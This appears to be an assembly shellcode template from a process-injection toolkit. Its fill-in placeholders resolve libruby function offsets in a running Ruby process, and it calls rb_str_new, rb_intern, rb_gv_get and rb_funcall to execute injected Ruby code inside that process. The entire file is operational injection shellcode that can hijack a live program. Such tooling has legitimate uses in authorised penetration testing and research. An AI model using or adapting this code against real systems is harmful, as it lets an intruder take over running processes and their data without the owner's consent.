// based on some of the general concepts discussed in:
// https://silverhammermba.github.io/emberb/c/
// https://blog.peterzhu.ca/creating-ruby-strings-c/
// https://blog.peterzhu.ca/ruby-c-ext/

[FRAGMENT:asminject_copy_bytes.s:FRAGMENT]

	push r13

	// copy the Ruby code string to arbitrary read/write memory
	// then make a Ruby string out of it
	// VALUE rb_str_new(const char *ptr, long len);
	push r14
	mov rdi, arbitrary_read_write_data_address[rip]
	add rdi, 0x1000
	lea rsi, ruby_code[rip]
	mov rcx, [VARIABLE:rubycode.length:VARIABLE]
	add rcx, 2												# null terminator
	push rdi
	call asminject_copy_bytes
	pop rdi
	mov rsi, [VARIABLE:rubycode.length:VARIABLE]
	sub rsi, 1
	mov rbx, [BASEADDRESS:.+/libruby[0-9\.so\-]+$:BASEADDRESS] + [RELATIVEOFFSET:rb_str_new:RELATIVEOFFSET]
	call rbx
	// keep the pointer around
	mov r10, rax
	pop r14
	// END: copy the Ruby code string to arbitrary read/write memory
	
	// copy the Ruby function name string to arbitrary read/write memory
	// then make a Ruby string out of it
	push r14
	push r10
	mov rdi, arbitrary_read_write_data_address[rip]
	add rdi, 0x400
	lea rsi, ruby_function_name[rip]
	mov rcx, [VARIABLE:rubyfunction.length:VARIABLE]
	add rcx, 2												# null terminator
	push rdi
	call asminject_copy_bytes
	pop rdi
	mov rsi, [VARIABLE:rubyfunction.length:VARIABLE]
	mov rbx, [BASEADDRESS:.+/libruby[0-9\.so\-]+$:BASEADDRESS] + [RELATIVEOFFSET:rb_str_new:RELATIVEOFFSET]
	call rbx
	// keep the pointer around
	mov r9, rax
	pop r10
	pop r14
	// END: copy the Ruby function name string to arbitrary read/write memory
		
	// copy the Ruby global variable name string to arbitrary read/write memory
	// then make a Ruby string out of it
	push r14
	push r10
	push r9
	mov rdi, arbitrary_read_write_data_address[rip]
	add rdi, 0x800
	lea rsi, ruby_global_variable[rip]
	mov rcx, [VARIABLE:globalvariable.length:VARIABLE]
	add rcx, 2												# null terminator
	push rdi
	call asminject_copy_bytes
	pop rdi
	mov rsi, [VARIABLE:globalvariable.length:VARIABLE]
	mov rbx, [BASEADDRESS:.+/libruby[0-9\.so\-]+$:BASEADDRESS] + [RELATIVEOFFSET:rb_str_new:RELATIVEOFFSET]
	call rbx
	// keep the pointer around
	mov r8, rax
	pop r9
	pop r10
	pop r14
	// END: copy the Ruby global variable name string to arbitrary read/write memory
	
	
	
	// BEGIN: call rb_intern to get a pointer to the specified function
	push r14
	push r10
	push r9
	push r8
	push rbx
	// function name Ruby string
	//mov rdi, r9
	// function name string
	mov rdi, arbitrary_read_write_data_address[rip]
	add rdi, 0x400
	mov rbx, [BASEADDRESS:.+/libruby[0-9\.so\-]+$:BASEADDRESS] + [RELATIVEOFFSET:rb_intern:RELATIVEOFFSET]
	call rbx
	// keep the pointer around
	mov r13, rax
	pop rbx
	pop r8
	pop r9
	pop r10
	pop r14
	
	// END: call call rb_intern to get a pointer to the specified function
	
	
	// BEGIN: call rb_gv_get to get a pointer to the specified global variable
	push r14
	push r13
	push r10
	push r9
	push r8
	push rbx
	// global variable name Ruby string
	//mov rdi, r8
	// global variable name string
	mov rdi, arbitrary_read_write_data_address[rip]
	add rdi, 0x800
	mov rbx, [BASEADDRESS:.+/libruby[0-9\.so\-]+$:BASEADDRESS] + [RELATIVEOFFSET:rb_gv_get:RELATIVEOFFSET]
	call rbx
	// keep the pointer around
	mov r12, rax
	pop rbx	
	pop r8
	pop r9
	pop r10
	pop r13
	pop r14
	
	// END: call rb_gv_get
	
	// BEGIN: call rb_funcall, passing the global variable, function, and argument
	push r14
	push r13
	push r12
	push r10
	push r9
	push r8
	push rbx
	// target object
	mov rdi, r12
	// function
	mov rsi, r13
	// number of arguments
	mov rdx, 1
	// code string
	mov rcx, r10
	mov rbx, [BASEADDRESS:.+/libruby[0-9\.so\-]+$:BASEADDRESS] + [RELATIVEOFFSET:rb_funcall:RELATIVEOFFSET]
	call rbx
	pop rbx
	pop r8
	pop r9
	pop r10
	pop r12
	pop r13
	pop r14
	
	// END: call rb_funcall
	
	# // BEGIN: call ruby_cleanup
	# push rbx
	# mov rdi, 0
	# mov rbx, [BASEADDRESS:.+/libruby[0-9\.so\-]+$:BASEADDRESS] + [RELATIVEOFFSET:ruby_cleanup:RELATIVEOFFSET]
	# call rbx
	# pop rbx
	# // END: call ruby_cleanup
	
	#mov rax, 0

	pop r13

SHELLCODE_SECTION_DELIMITER

ruby_code:
	.ascii "[VARIABLE:rubycode:VARIABLE]\0"

ruby_function_name:
	.ascii "[VARIABLE:rubyfunction:VARIABLE]\0"

ruby_global_variable:
	.ascii "[VARIABLE:globalvariable:VARIABLE]\0"

#ruby_argv:
#	.ascii "\0"
	
#ruby_argc:
#	.byte 1

